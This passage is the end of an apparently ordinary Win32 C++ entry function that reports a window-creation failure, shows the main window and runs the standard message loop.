        MessageBoxW(nullptr, L"Failed to create window.",
            L"Error", MB_ICONERROR);
        return 1;
    }

    ShowWindow(g_hMain, SW_SHOW);
    UpdateWindow(g_hMain);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}
